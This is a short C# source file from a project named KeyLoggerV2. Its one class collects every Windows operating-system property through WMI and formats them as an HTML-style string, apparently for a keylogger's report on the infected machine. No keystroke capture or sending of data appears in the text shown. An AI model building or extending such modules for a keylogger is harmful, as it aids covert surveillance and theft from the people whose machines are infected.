using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerV2
{
    class OperatingSystem
    {
        private static TextBox txtBody = new TextBox();

        //Getting the OperatingSystem information from the ManagementClass. Other classes could be: Processer, BIOS, Keyboard.
        public string GetOsInformation()
        {
            try
            {
                ManagementClass mc = new ManagementClass("Win32_OperatingSystem");

                foreach (ManagementObject mngObj in mc.GetInstances())
                {
                    foreach (PropertyData pd in mngObj.Properties)
                    {
                        if (pd.Value != null)
                        {
                            txtBody.Text += "<br>" + pd.Name + ":" + pd.Value + "<br>";
                        }
                    }
                }
                return txtBody.Text;
            }
            catch
            {
              return "Not available";
            }
        }
    }
}
